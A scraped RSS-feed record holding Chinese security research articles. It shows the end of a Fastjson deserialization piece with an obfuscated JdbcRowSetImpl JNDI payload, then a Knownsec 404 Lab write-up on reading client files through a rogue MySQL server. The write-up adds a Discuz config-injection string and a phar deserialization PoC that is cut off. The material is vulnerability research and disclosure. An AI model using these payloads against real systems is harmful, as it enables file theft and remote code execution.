&#34;com.sun.rowset.JdbcRowSetImpl&#34;}, &#34;rand2&#34;: {&#34;rand1&#34;: {&#34;@type&#34;: &#34;\\x63\\x6f\\x6d\\x2e\\x73\\x75\\x6e\\x2e\\x72\\x6f\\x77\\x73\\x65\\x74\\x2e\\x4a\\x64\\x62\\x63\\x52\\x6f\\x77\\x53\\x65\\x74\\x49\\x6d\\x70\\x6c&#34;, &#34;dataSourceName&#34;: &#34;ldap://localhost:1389/Object&#34;, &#34;autoCommit&#34;: true}}}</pre>\n\n\n\n<p>有些师傅也通过扫描maven仓库包来寻找符合jackson、fastjson的恶意利用类，似乎大多数都是在寻找jndi类型的漏洞。对于跑黑名单，可以看下这个<a href=\"https://github.com/LeadroyaL/fastjson-blacklist\">项目</a>，跑到1.2.62版本了，跑出来了大多数黑名单，不过很多都是包，具体哪个类还得去包中一一寻找。</p>\n\n\n\n<h4 id=\"_1\">参考链接</h4>\n\n\n\n<ol><li><a href=\"https://paper.seebug.org/994/#0x03\">https://paper.seebug.org/994/#0x03</a></li><li><a href=\"https://paper.seebug.org/1155/\">https://paper.seebug.org/1155/</a></li><li><a href=\"https://paper.seebug.org/994/\">https://paper.seebug.org/994/</a></li><li><a href=\"https://paper.seebug.org/292/\">https://paper.seebug.org/292/</a></li><li><a href=\"https://paper.seebug.org/636/\">https://paper.seebug.org/636/</a></li><li><a href=\"https://www.anquanke.com/post/id/182140#h2-1\">https://www.anquanke.com/post/id/182140#h2-1</a></li><li><a href=\"https://github.com/LeadroyaL/fastjson-blacklist\">https://github.com/LeadroyaL/fastjson-blacklist</a></li><li><a href=\"http://www.lmxspace.com/2019/06/29/FastJson-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0/#v1-2-47\">http://www.lmxspace.com/2019/06/29/FastJson-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0/#v1-2-47</a></li><li><a href=\"http://xxlegend.com/2017/12/06/%E5%9F%BA%E4%BA%8EJdbcRowSetImpl%E7%9A%84Fastjson%20RCE%20PoC%E6%9E%84%E9%80%A0%E4%B8%8E%E5%88%86%E6%9E%90/\">http://xxlegend.com/2017/12/06/%E5%9F%BA%E4%BA%8EJdbcRowSetImpl%E7%9A%84Fastjson%20RCE%20PoC%E6%9E%84%E9%80%A0%E4%B8%8E%E5%88%86%E6%9E%90/</a></li><li><a href=\"http://xxlegend.com/2017/04/29/title-%20fastjson%20%E8%BF%9C%E7%A8%8B%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96poc%E7%9A%84%E6%9E%84%E9%80%A0%E5%92%8C%E5%88%86%E6%9E%90/\">http://xxlegend.com/2017/04/29/title-%20fastjson%20%E8%BF%9C%E7%A8%8B%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96poc%E7%9A%84%E6%9E%84%E9%80%A0%E5%92%8C%E5%88%86%E6%9E%90/</a></li><li><a href=\"http://gv7.me/articles/2020/several-ways-to-detect-fastjson-through-dnslog/#0x03-%E6%96%B9%E6%B3%95%E4%BA%8C-%E5%88%A9%E7%94%A8java-net-InetSocketAddress\">http://gv7.me/articles/2020/several-ways-to-detect-fastjson-through-dnslog/#0x03-%E6%96%B9%E6%B3%95%E4%BA%8C-%E5%88%A9%E7%94%A8java-net-InetSocketAddress</a></li><li><a href=\"https://xz.aliyun.com/t/7027#toc-4\">https://xz.aliyun.com/t/7027#toc-4</a></li><li><a href=\"https://zhuanlan.zhihu.com/p/99075925\">https://zhuanlan.zhihu.com/p/99075925</a></li><li>...</li></ol>\n\n\n\n<p>太多了，感谢师傅们的辛勤记录。</p>\n\n\n\n<hr class=\"wp-block-separator\" />\n\n\n\n<figure class=\"wp-block-image\"><img src=\"https://images.seebug.org/content/images/2017/08/0e69b04c-e31f-4884-8091-24ec334fbd7e.jpeg\" alt=\"Paper\" /></figure>\n\n\n\n<p>本文由 Seebug Paper 发布，如需转载请注明来源。本文地址：<a href=\"https://paper.seebug.org/1192/\">https://paper.seebug.org/1192/</a><br></p>\n","descriptionType":"html","publishedDate":"Fri, 31 Jul 2020 03:25:40 +0000","feedId":2536,"bgimg":"https://images.seebug.org/content/images/2020/05/aa962743-3baf-4fe9-acbb-c012bfac2c38.png-w331s","linkMd5":"4a5286bc6e84190a6e8a94ada1248a16","bgimgJsdelivr":"https://cdn.jsdelivr.net/gh/myreaderx6/cdn37@2020_2/2020/08/24/21-14-49-951_144ed9d0e159ab64.webp","destWidth":1871,"destHeight":905,"sourceBytes":142057,"destBytes":165896,"author":"叶霖 杨","articleImgCdnMap":{"https://images.seebug.org/content/images/2020/05/aa962743-3baf-4fe9-acbb-c012bfac2c38.png-w331s":"https://cdn.jsdelivr.net/gh/myreaderx6/cdn37@2020_2/2020/08/24/21-14-49-951_144ed9d0e159ab64.webp","https://images.seebug.org/content/images/2020/05/ced3c3bc-76c0-4109-9e9e-5e9ec40084b1.png-w331s":"https://cdn.jsdelivr.net/gh/myreaderx13/cdn15@2020_6/2020/08/24/21-14-58-428_6d483b57a5a67aa9.webp","https://images.seebug.org/content/images/2020/05/985e89cf-2cb5-484a-9e88-10567d6d87a3.png-w331s":"https://cdn.jsdelivr.net/gh/myreaderx4/cdn69@2020_3/2020/08/24/21-14-55-987_33187e702e77a409.webp","https://images.seebug.org/content/images/2020/05/f523f88c-6e76-457c-a1b0-9fdbbb852a05.png-w331s":"https://cdn.jsdelivr.net/gh/myreaderx10/cdn59@2020_4/2020/08/24/21-14-54-603_45a9ae87fa1b5e82.webp","https://images.seebug.org/content/images/2020/05/4112990e-9522-493d-8188-c79e1779fd8e.png-w331s":"https://cdn.jsdelivr.net/gh/myreaderx18/cdn56@2020_5/2020/08/24/21-14-58-747_72a9e8c9f77bab85.webp","https://images.seebug.org/content/images/2020/05/78109ea2-fc51-4896-8a9a-93e73b197891.png-w331s":"https://cdn.jsdelivr.net/gh/myreaderx13/cdn65@2020_3/2020/08/24/21-14-52-609_c96954cca08bb5b0.webp","https://images.seebug.org/content/images/2020/05/7b9cae35-a1a4-4f89-a96f-8d5e8430f4a4.png-w331s":"https://cdn.jsdelivr.net/gh/myreaderx31/cdn26@2020_2/2020/08/24/21-14-53-544_e17eee3920b07d19.webp","https://images.seebug.org/content/images/2020/05/247f9866-4481-4c82-b372-95c0d56df76f.png-w331s":"https://cdn.jsdelivr.net/gh/myreaderx33/cdn78@2020_5/2020/08/24/21-14-52-929_46fe55fc54380fa5.webp","https://images.seebug.org/content/images/2020/05/0006a9e3-ab96-4dbe-bac3-fc90f7f156f0.png-w331s":"https://cdn.jsdelivr.net/gh/myreaderx24/cdn72@2020_5/2020/08/24/21-14-58-086_65ef6fc1527a6078.webp","https://images.seebug.org/content/images/2020/05/12f037cb-ba9b-4635-8421-5a57331766d8.png-w331s":"https://cdn.jsdelivr.net/gh/myreaderx22/cdn43@2020_2/2020/08/24/21-15-01-690_f990e0ac4dbbede8.webp","https://images.seebug.org/content/images/2020/05/b09114c5-0e75-4660-acd7-7798c55f7122.png-w331s":"https://cdn.jsdelivr.net/gh/myreaderx14/cdn99@2020_1/2020/08/24/21-15-01-380_0b20c182a48ad562.webp","https://images.seebug.org/content/images/2020/05/15529a91-35a8-4198-b2d7-159a36920575.png-w331s":"https://cdn.jsdelivr.net/gh/myreaderx21/cdn6@2020_2/2020/08/24/21-14-56-118_766671c019129794.webp","https://images.seebug.org/content/images/2020/05/7c0ff045-44e1-4e31-b433-0d935f1f5055.png-w331s":"https://cdn.jsdelivr.net/gh/myreaderx16/cdn30@2020_5/2020/08/24/21-14-52-856_f2bfa7e8931e428b.webp","https://images.seebug.org/content/images/2020/05/d466118d-e01a-45ba-b2f9-c2b5d345c8f8.png-w331s":"https://cdn.jsdelivr.net/gh/myreaderx30/cdn42@2020_4/2020/08/24/21-14-56-814_62df36c7ec8ef6f6.webp","https://images.seebug.org/content/images/2020/05/2c1569a3-1e83-4e1c-9320-3aa08564caae.png-w331s":"https://cdn.jsdelivr.net/gh/myreaderx2/cdn54@2020_4/2020/08/24/21-14-54-535_ad346f38dec1cd96.webp","https://images.seebug.org/content/images/2020/05/4004f4d6-92f8-4358-8357-8ec4cccddbb1.png-w331s":"https://cdn.jsdelivr.net/gh/myreaderx12/cdn64@2020_6/2020/08/24/21-14-53-657_179ca8d87c54ad5f.webp","https://images.seebug.org/content/images/2020/05/2e0a0eff-dc21-4add-a381-045f4b7751ec.png-w331s":"https://cdn.jsdelivr.net/gh/myreaderx15/cdn84@2020_2/2020/08/24/21-15-00-659_9cb3e31d272e4f92.webp","https://images.seebug.org/content/images/2020/05/d08e30b6-79fb-4eda-842e-57e40d18e066.png-w331s":"https://cdn.jsdelivr.net/gh/myreaderx11/cdn93@2020_1/2020/08/24/21-14-53-068_a5052635edc4f9dc.webp","https://images.seebug.org/content/images/2020/05/c7198bce-44be-46eb-9a02-6f1bcd0badbc.png-w331s":"https://cdn.jsdelivr.net/gh/myreaderx29/cdn5@2020_4/2020/08/24/21-14-55-360_c5668405728bbbfd.webp","https://images.seebug.org/content/images/2020/05/bb4276d2-ff2f-4f7c-95ed-27530edfb9ba.png-w331s":"https://cdn.jsdelivr.net/gh/myreaderx30/cdn30@2020_4/2020/08/24/21-14-55-536_0caecd132899062a.webp","https://images.seebug.org/content/images/2020/05/9821afb8-49b0-4b7a-a480-32d5d8488e56.png-w331s":"https://cdn.jsdelivr.net/gh/myreaderx24/cdn58@2020_1/2020/08/24/21-14-57-076_1de9ab1a2d3ae59e.webp","https://images.seebug.org/content/images/2020/05/f0846877-c8cb-464d-a230-4897773c3676.png-w331s":"https://cdn.jsdelivr.net/gh/myreaderx10/cdn85@2020_1/2020/08/24/21-14-55-926_cd060fc76f1074cb.webp","https://images.seebug.org/content/images/2020/05/e23f4b42-04d2-4360-802e-84d4390eab2d.png-w331s":"https://cdn.jsdelivr.net/gh/myreaderx1/cdn92@2020_1/2020/08/24/21-15-01-007_d2194845fba6098a.webp","https://images.seebug.org/content/images/2020/05/8c8e7426-63bd-440c-b502-4e435fba6752.png-w331s":"https://cdn.jsdelivr.net/gh/myreaderx32/cdn9@2020_4/2020/08/24/21-14-54-353_f2f1fdb5ebeff47b.webp","https://images.seebug.org/content/images/2020/05/607c76f3-3d03-471f-89df-8da048f42985.png-w331s":"https://cdn.jsdelivr.net/gh/myreaderx23/cdn11@2020_4/2020/08/24/21-14-59-582_62b057794731cf75.webp","https://images.seebug.org/content/images/2017/08/0e69b04c-e31f-4884-8091-24ec334fbd7e.jpeg":"https://cdn.jsdelivr.net/gh/myreaderx6/cdn7@2020_5/2020/08/24/21-15-00-499_446834a71d30acd0.webp"},"publishedOrCreatedDate":1598303688720},{"createdTime":"2020-08-25 05:14:48","updatedTime":"2020-08-25 05:14:48","title":"CSS-T | Mysql Client 任意文件读取攻击链拓展","link":"https://blog.knownsec.com/?p=5035","description":"\n<p><strong>作者：LoRexxar@知道创宇404实验室 &#38; Dawu@知道创宇404实验室</strong><br><strong>英文版本：<a href=\"https://paper.seebug.org/1113/\">https://paper.seebug.org/1113/</a></strong></p>\n\n\n\n<p>这应该是一个很早以前就爆出来的漏洞，而我见到的时候是在TCTF2018 final线下赛的比赛中，是被 Dragon Sector 和 Cykor 用来非预期h4x0r's club这题的一个技巧。</p>\n\n\n\n<figure class=\"wp-block-embed\"><div class=\"wp-block-embed__wrapper\">\nhttp://russiansecurity.expert/2016/04/20/mysql-connect-file-read/\n</div></figure>\n\n\n\n<p>在后来的研究中，和@Dawu的讨论中顿时觉得这应该是一个很有趣的trick，在逐渐追溯这个漏洞的过去的过程中，我渐渐发现这个问题作为mysql的一份feature存在了很多年，从13年就有人分享这个问题。</p>\n\n\n\n<ul><li><a href=\"https://www.slideshare.net/qqlan/database-honeypot-by-design-25195927\">Database Honeypot by design (2013 8月 Presentation from Yuri Goltsev)</a></li><li><a href=\"https://github.com/Gifts/Rogue-MySql-Server\">Rogue-MySql-Server Tool (2013年 9月 MySQL fake server to read files of connected clients)</a></li><li><a href=\"https://w00tsec.blogspot.com/2018/04/abusing-mysql-local-infile-to-read.html\">Abusing MySQL LOCAL INFILE to read client files (2018年4月23日)</a></li></ul>\n\n\n\n<p>在围绕这个漏洞的挖掘过程中，我们不断地发现新的利用方式，所以将其中大部分的发现都总结并准备了议题在CSS上分享，下面让我们来一步步分析。</p>\n\n\n\n<h1 id=\"load-data-infile\">Load data infile</h1>\n\n\n\n<p>load data infile是一个很特别的语法，熟悉注入或者经常打CTF的朋友可能会对这个语法比较熟悉，在CTF中，我们经常能遇到没办法load_file读取文件的情况，这时候唯一有可能读到文件的就是load data infile，一般我们常用的语句是这样的：</p>\n\n\n\n<pre class=\"crayon-plain-tag\">load data infile &#34;/etc/passwd&#34; into table test FIELDS TERMINATED BY '\\n';</pre>\n\n\n\n<p>mysql server会读取服务端的/etc/passwd然后将数据按照<code>'\\n'</code>分割插入表中，但现在这个语句同样要求你有FILE权限，以及非local加载的语句也受到<code>secure_file_priv</code>的限制</p>\n\n\n\n<pre class=\"crayon-plain-tag\">mysql&#38;gt; load data infile &#34;/etc/passwd&#34; into table test FIELDS TERMINATED BY '\\n';\n\nERROR 1290 (HY000): The MySQL server is running with the --secure-file-priv option so it cannot execute this statement</pre>\n\n\n\n<p>如果我们修改一下语句，加入一个关键字local。</p>\n\n\n\n<pre class=\"crayon-plain-tag\">mysql&#38;gt; load data local infile &#34;/etc/passwd&#34; into table test FIELDS TERMINATED BY '\\n';\nQuery OK, 11 rows affected, 11 warnings (0.01 sec)\nRecords: 11  Deleted: 0  Skipped: 0  Warnings: 11</pre>\n\n\n\n<p>加了local之后，这个语句就成了，读取客户端的文件发送到服务端，上面那个语句执行结果如下</p>\n\n\n\n<figure class=\"wp-block-image\"><img src=\"https://images.seebug.org/content/images/2020/01/6c2dc026-fc41-433f-ab54-fa0ae3987be7.png-w331s\" alt=\"\" /></figure>\n\n\n\n<p>很显然，这个语句是不安全的，在mysql的文档里也充分说明了这一点</p>\n\n\n\n<figure class=\"wp-block-embed\"><div class=\"wp-block-embed__wrapper\">\nhttps://dev.mysql.com/doc/refman/8.0/en/load-data-local.html\n</div></figure>\n\n\n\n<p>在mysql文档中的说到，<strong>服务端可以要求客户端读取有可读权限的任何文件</strong>。</p>\n\n\n\n<p>mysql认为<strong>客户端不应该连接到不可信的服务端</strong>。</p>\n\n\n\n<figure class=\"wp-block-image\"><img src=\"https://images.seebug.org/content/images/2020/01/aa58b1ee-630b-4f2b-962f-9b0390559704.png-w331s\" alt=\"\" /></figure>\n\n\n\n<p>我们今天的这个问题，就是围绕这个基础展开的。</p>\n\n\n\n<h1 id=\"_1\">构造恶意服务端</h1>\n\n\n\n<p>在思考明白了前面的问题之后，核心问题就成了，我们怎么构造一个恶意的mysql服务端。</p>\n\n\n\n<p>在搞清楚这个问题之前，我们需要研究一下mysql正常执行链接和查询的数据包结构。</p>\n\n\n\n<p>1、greeting包，服务端返回了banner，其中包含mysql的版本</p>\n\n\n\n<figure class=\"wp-block-image\"><img src=\"https://images.seebug.org/content/images/2020/01/e53b8f71-39aa-4b18-96b8-d74a413b513b.png-w331s\" alt=\"\" /></figure>\n\n\n\n<p>2、客户端登录请求</p>\n\n\n\n<figure class=\"wp-block-image\"><img src=\"https://images.seebug.org/content/images/2020/01/33e67c1a-6191-428a-a780-4d8d76f481db.png-w331s\" alt=\"\" /></figure>\n\n\n\n<p>3、然后是初始化查询，这里因为是phpmyadmin所以初始化查询比较多</p>\n\n\n\n<figure class=\"wp-block-image\"><img src=\"https://images.seebug.org/content/images/2020/01/c847d3bf-ba54-4569-b854-fab51bfa8d1d.png-w331s\" alt=\"\" /></figure>\n\n\n\n<p>4、load file local</p>\n\n\n\n<p>由于我的环境在windows下，所以这里读取为<code>C:/Windows/win.ini</code>，语句如下</p>\n\n\n\n<pre class=\"crayon-plain-tag\">load data local infile &#34;C:/Windows/win.ini&#34; into table test FIELDS TERMINATED BY '\\n';</pre>\n\n\n\n<p>首先是客户端发送查询</p>\n\n\n\n<figure class=\"wp-block-image\"><img src=\"https://images.seebug.org/content/images/2020/01/8e9399b4-1ef4-4117-bf48-6578517ca95a.png-w331s\" alt=\"\" /></figure>\n\n\n\n<p>然后服务端返回了需要的路径</p>\n\n\n\n<figure class=\"wp-block-image\"><img src=\"https://images.seebug.org/content/images/2020/01/a4e7ce99-3d0b-4d0f-a4bf-bea9dada1416.png-w331s\" alt=\"\" /></figure>\n\n\n\n<p>然后客户端直接把内容发送到了服务端</p>\n\n\n\n<figure class=\"wp-block-image\"><img src=\"https://images.seebug.org/content/images/2020/01/be3119ec-00b7-44f2-a394-4bfbefc68eaf.png-w331s\" alt=\"\" /></figure>\n\n\n\n<p>看起来流程非常清楚，而且客户端读取文件的路径并不是从客户端指定的，而是发送到服务端，服务端制定的。</p>\n\n\n\n<p>原本的查询流程为</p>\n\n\n\n<pre class=\"crayon-plain-tag\">客户端：我要把win.ini插入test表中\n服务端：我要你的win.ini内容\n客户端：win.ini的内容如下....</pre>\n\n\n\n<p>假设服务端由我们控制，把一个正常的流程篡改成如下</p>\n\n\n\n<pre class=\"crayon-plain-tag\">客户端：我要test表中的数据\n服务端：我要你的win.ini内容\n客户端：win.ini的内容如下???</pre>\n\n\n\n<p>上面的第三句究竟会不会执行呢？</p>\n\n\n\n<p>让我们回到<a href=\"https://dev.mysql.com/doc/refman/8.0/en/load-data-local.html\">mysql的文档</a>中，文档中有这么一句话：</p>\n\n\n\n<figure class=\"wp-block-image\"><img src=\"https://images.seebug.org/content/images/2020/01/291ea879-e6dd-46a6-af48-4dd927485670.png-w331s\" alt=\"\" /></figure>\n\n\n\n<p><strong>服务端可以在任何查询语句后回复文件传输请求</strong>，也就是说我们的想法是成立的</p>\n\n\n\n<p>在深入研究漏洞的过程中，不难发现这个漏洞是否成立在于Mysql client端的配置问题，而经过一番研究，我发现在mysql登录验证的过程中，会发送客户端的配置。</p>\n\n\n\n<figure class=\"wp-block-image\"><img src=\"https://images.seebug.org/content/images/2020/01/90884546-97b7-47b1-a29e-9912f5c1e69a.png-w331s\" alt=\"\" /></figure>\n\n\n\n<p>在greeting包之后，客户端就会链接并试图登录，同时数据包中就有关于是否允许使用load data local的配置，可以从这里直白的看出来客户端是否存在这个问题（这里返回的客户端配置不一定是准确的，后面会提到这个问题）。</p>\n\n\n\n<h1 id=\"poc\">poc</h1>\n\n\n\n<p>在想明白原理之后，构建恶意服务端就变得不那么难了，流程很简单 1.回复mysql client一个greeting包 2.等待client端发送一个查询包 3.回复一个file transfer包</p>\n\n\n\n<p>这里主要是构造包格式的问题，可以跟着原文以及各种文档完成上述的几次查询.</p>\n\n\n\n<p>值得注意的是，原作者给出的poc并没有适配所有的情况，部分mysql客户端会在登陆成功之后发送ping包，如果没有回复就会断开连接。也有部分mysql client端对greeting包有较强的校验，建议直接抓包按照真实包内容来构造。</p>\n\n\n\n<ul><li><a href=\"https://dev.mysql.com/doc/internals/en/connection-phase-packets.html#packet-Protocol::Handshake\">https://dev.mysql.com/doc/internals/en/connection-phase-packets.html#packet-Protocol::Handshake</a></li><li><a href=\"https://dev.mysql.com/doc/internals/en/com-query-response.html\">https://dev.mysql.com/doc/internals/en/com-query-response.html</a></li></ul>\n\n\n\n<p>原作者给出的poc</p>\n\n\n\n<figure class=\"wp-block-embed\"><div class=\"wp-block-embed__wrapper\">\nhttps://github.com/Gifts/Rogue-MySql-Server\n</div></figure>\n\n\n\n<h1 id=\"_2\">演示</h1>\n\n\n\n<p>这里用了一台腾讯云做服务端，客户端使用phpmyadmin连接</p>\n\n\n\n<figure class=\"wp-block-image\"><img src=\"https://images.seebug.org/content/images/2020/01/c3b395ad-cf4a-4f65-8584-eb9199ecf4a0.png-w331s\" alt=\"\" /></figure>\n\n\n\n<figure class=\"wp-block-image\"><img src=\"https://images.seebug.org/content/images/2020/01/511f3f93-4d6c-43d0-a614-4cc1a686209b.png-w331s\" alt=\"\" /></figure>\n\n\n\n<p>我们成功读取了文件。</p>\n\n\n\n<h1 id=\"_3\">影响范围</h1>\n\n\n\n<h2 id=\"_4\">底层应用</h2>\n\n\n\n<p>在这个漏洞到底有什么影响的时候，我们首先必须知道到底有什么样的客户端受到这个漏洞的威胁。</p>\n\n\n\n<ul><li>mysql client (pwned)</li><li>php mysqli (pwned，fixed by 7.3.4)</li><li>php pdo (默认禁用)</li><li>python MySQLdb (pwned)</li><li>python mysqlclient (pwned)</li><li>java JDBC Driver (pwned，部分条件下默认禁用)</li><li>navicat （pwned)</li></ul>\n\n\n\n<h2 id=\"_5\">探针</h2>\n\n\n\n<p>在深入挖掘这个漏洞的过程中，第一时间想到的利用方式就是mysql探针，但可惜的是，在测试了市面上的大部分探针后发现大部分的探针连接之后只接受了greeting包就断开连接了，没有任何查询，尽职尽责。</p>\n\n\n\n<ul><li>雅黑PHP探针 失败</li><li>iprober2 探针 失败</li><li>PHP探针 for LNMP一键安装包 失败</li><li>UPUPW PHP 探针 失败</li><li>...</li></ul>\n\n\n\n<h2 id=\"_6\">云服务商 云数据库 数据迁移服务</h2>\n\n\n\n<figure class=\"wp-block-image\"><img src=\"https://images.seebug.org/content/images/2020/02/e95cd253-be42-413c-89b4-8a6dde233c59.png-w331s\" alt=\"\" /></figure>\n\n\n\n<p>以上漏洞均在2018年报送官方并遵守漏洞纰漏原则</p>\n\n\n\n<p>国内</p>\n\n\n\n<ul><li>腾讯云 DTS 失败，禁用Load data local</li><li>阿里云 RDS 数据迁移失败，禁用Load data local</li><li>华为云 RDS DRS服务 成功</li></ul>\n\n\n\n<figure class=\"wp-block-image\"><img src=\"https://images.seebug.org/content/images/2020/01/8f9113ec-33b6-4313-bc7a-61e1ab607322.png-w331s\" alt=\"\" /></figure>\n\n\n\n<figure class=\"wp-block-image\"><img src=\"https://images.seebug.org/content/images/2020/01/ae52a1ad-c092-427f-b647-7dbd0c085906.png-w331s\" alt=\"\" /></figure>\n\n\n\n<ul><li>京东云 RDS不支持远程迁移功能，分布式关系数据库未开放</li><li>UCloud RDS不支持远程迁移功能，分布式关系数据库不能对外数据同步</li><li>QiNiu云 RDS不支持远程迁移功能</li><li>新睿云 RDS不支持远程迁移功能</li><li>网易云 RDS 外部实例迁移 成功</li></ul>\n\n\n\n<figure class=\"wp-block-image\"><img src=\"https://images.seebug.org/content/images/2020/01/9b86c20c-ece2-44b3-8338-c82a62e93dde.png-w331s\" alt=\"\" /></figure>\n\n\n\n<ul><li>金山云 RDS DTS数据迁移 成功</li></ul>\n\n\n\n<figure class=\"wp-block-image\"><img src=\"https://images.seebug.org/content/images/2020/01/3d907ced-e9e6-456c-82bb-07878c6ffcbe.png-w331s\" alt=\"\" /></figure>\n\n\n\n<figure class=\"wp-block-image\"><img src=\"https://images.seebug.org/content/images/2020/01/b0c089b7-626a-4754-a28a-5e240c2630c1.png-w331s\" alt=\"\" /></figure>\n\n\n\n<ul><li>青云Cloud RDS 数据导入 失败，禁用load data local</li><li>百度Cloud RDS DTS 成功</li></ul>\n\n\n\n<figure class=\"wp-block-image\"><img src=\"https://images.seebug.org/content/images/2020/01/2c2ccf41-e547-4e4c-ad75-1efc6115619e.png-w331s\" alt=\"\" /></figure>\n\n\n\n<p>国际云服务商</p>\n\n\n\n<ul><li>Google could SQL数据库迁移失败，禁用Load data infile</li><li>AWS RDS DMS服务 成功</li></ul>\n\n\n\n<figure class=\"wp-block-image\"><img src=\"https://images.seebug.org/content/images/2020/01/8be09aec-6224-4656-8020-3c22403148ec.png-w331s\" alt=\"\" /></figure>\n\n\n\n<figure class=\"wp-block-image\"><img src=\"https://images.seebug.org/content/images/2020/01/a04db4e7-7b94-40e7-9518-6062a46ef395.png-w331s\" alt=\"\" /></figure>\n\n\n\n<h2 id=\"excel-online-sql\">Excel online sql查询</h2>\n\n\n\n<p>之前的一篇文章中提到过，在Excel中一般有这样一个功能，从数据库中同步数据到表格内，这样一来就可以通过上述方式读取文件。</p>\n\n\n\n<p>受到这个思路的启发，我们想到可以找online的excel的这个功能，这样就可以实现任意文件读取了。</p>\n\n\n\n<ul><li>WPS failed（没找到这个功能）</li><li>Microsoft excel failed（禁用了infile语句）</li><li>Google 表格 （原生没有这个功能，但却支持插件，下面主要说插件）<ul><li>Supermetrics pwned</li></ul></li></ul>\n\n\n\n<figure class=\"wp-block-image\"><img src=\"https://images.seebug.org/content/images/2020/01/2b361b21-f6c9-438a-8f1f-aac90656e6be.png-w331s\" alt=\"\" /></figure>\n\n\n\n<figure class=\"wp-block-image\"><img src=\"https://images.seebug.org/content/images/2020/01/70ab5ff4-662c-4d88-a294-827053eccb06.png-w331s\" alt=\"\" /></figure>\n\n\n\n<pre class=\"crayon-plain-tag\">- Advanced CFO Solutions MySQL Query failed\n- SeekWell failed\n- Skyvia Query Gallery failed\n- database Borwser failed\n- Kloudio pwned</pre>\n\n\n\n<figure class=\"wp-block-image\"><img src=\"https://images.seebug.org/content/images/2020/01/493cbb0c-fa2b-4ead-8e33-df260c886fdb.png-w331s\" alt=\"\" /></figure>\n\n\n\n<h1 id=\"2rce\">拓展？2RCE！</h1>\n\n\n\n<p>抛开我们前面提的一些很特殊的场景下，我们也要讨论一些这个漏洞在通用场景下的利用攻击链。</p>\n\n\n\n<p>既然是围绕任意文件读取来讨论，那么最能直接想到的一定是有关配置文件的泄露所导致的漏洞了。</p>\n\n\n\n<h2 id=\"with\">任意文件读 with 配置文件泄露</h2>\n\n\n\n<p>在Discuz x3.4的配置中存在这样两个文件</p>\n\n\n\n<pre class=\"crayon-plain-tag\">config/config_ucenter.php\nconfig/config_global.php</pre>\n\n\n\n<p>在dz的后台，有一个ucenter的设置功能，这个功能中提供了ucenter的数据库服务器配置功能，通过配置数据库链接恶意服务器，可以实现任意文件读取获取配置信息。</p>\n\n\n\n<figure class=\"wp-block-image\"><img src=\"https://images.seebug.org/content/images/2020/01/3d3f6fb2-6e49-459a-a211-0e89b928047d.png-w331s\" alt=\"\" /></figure>\n\n\n\n<p>配置ucenter的访问地址。</p>\n\n\n\n<pre class=\"crayon-plain-tag\">原地址： http://localhost:8086/upload/uc_server\n修改为： http://localhost:8086/upload/uc_server\\');phpinfo();//</pre>\n\n\n\n<p>当我们获得了authkey之后，我们可以通过admin的uid以及盐来计算admin的cookie。然后用admin的cookie以及<code>UC_KEY</code>来访问即可生效</p>\n\n\n\n<figure class=\"wp-block-image\"><img src=\"https://images.seebug.org/content/images/2020/01/1cb2003d-40e8-4acb-80f5-83dc55d4bf94.png-w331s\" alt=\"\" /></figure>\n\n\n\n<h2 id=\"to\">任意文件读 to 反序列化</h2>\n\n\n\n<p>2018年BlackHat大会上的Sam Thomas分享的File Operation Induced Unserialization via the “phar://” Stream Wrapper议题，原文<a href=\"https://i.blackhat.com/us-18/Thu-August-9/us-18-Thomas-Its-A-PHP-Unserialization-Vulnerability-Jim-But-Not-As-We-Know-It-wp.pdf\">https://i.blackhat.com/us-18/Thu-August-9/us-18-Thomas-Its-A-PHP-Unserialization-Vulnerability-Jim-But-Not-As-We-Know-It-wp.pdf&#160;</a>。</p>\n\n\n\n<p>在该议题中提到，在PHP中存在一个叫做<a href=\"https://secure.php.net/manual/zh/internals2.ze1.streams.php\">Stream API</a>，通过注册拓展可以注册相应的伪协议，而phar这个拓展就注册了<code>phar://</code>这个stream wrapper。</p>\n\n\n\n<p>在我们知道创宇404实验室安全研究员seaii曾经的研究(<a href=\"https://paper.seebug.org/680/\">https://paper.seebug.org/680/</a>)中表示，所有的文件函数都支持stream wrapper。</p>\n\n\n\n<figure class=\"wp-block-image\"><img src=\"https://images.seebug.org/content/images/2020/01/9ff109c7-a1eb-4053-93bc-e7ab8f203015.png-w331s\" alt=\"\" /></figure>\n\n\n\n<p>深入到函数中，我们可以发现，可以支持steam wrapper的原因是调用了</p>\n\n\n\n<pre class=\"crayon-plain-tag\">stream = php_stream_open_wrapper_ex(filename, &#34;rb&#34; ....);</pre>\n\n\n\n<p>从这里，我们再回到mysql的load file local语句中，在mysqli中，mysql的读文件是通过php的函数实现的</p>\n\n\n\n<pre class=\"crayon-plain-tag\">https://github.com/php/php-src/blob/master/ext/mysqlnd/mysqlnd_loaddata.c#L43-L52\n\nif (PG(open_basedir)) {\n        if (php_check_open_basedir_ex(filename, 0) == -1) {\n            strcpy(info-&#38;gt;error_msg, &#34;open_basedir restriction in effect. Unable to open file&#34;);\n            info-&#38;gt;error_no = CR_UNKNOWN_ERROR;\n            DBG_RETURN(1);\n        }\n    }\n\n    info-&#38;gt;filename = filename;\n    info-&#38;gt;fd = php_stream_open_wrapper_ex((char *)filename, &#34;r&#34;, 0, NULL, context);</pre>\n\n\n\n<p>也同样调用了<code>php_stream_open_wrapper_ex</code>函数，也就是说，我们同样可以通过读取phar文件来触发反序列化。</p>\n\n\n\n<h3 id=\"_7\">复现</h3>\n\n\n\n<p>首先需要一个生成一个phar</p>\n\n\n\n<pre class=\"crayon-plain-tag\">pphar.php\n\n&#38;lt;?php\nclass A {\n    public $s = '';\n    public function __wakeup () {\n        echo &#34;pwned!!&#34;;\n    }\n}\n\n\n@unlink(&#34;phar.phar&#34;);\n$phar = new Phar(&#34;phar.phar&#34;); //后缀名必须为phar\n$phar-&#38;gt;startBuffering();\n$phar-&#38;gt;setStub(&#34;GIF89a &#34;.&#34;&#38;lt;?php __HALT_COMPILER(); ?&#38;gt;&#34;); //设置stub\n$o = new A();\n$phar-&#38;gt;setMetadata($o); //将自定义的meta-data存入manifest\n$phar-&#38;gt;addFromString(&#34;test.txt&#34;, &#34;test&#34;); 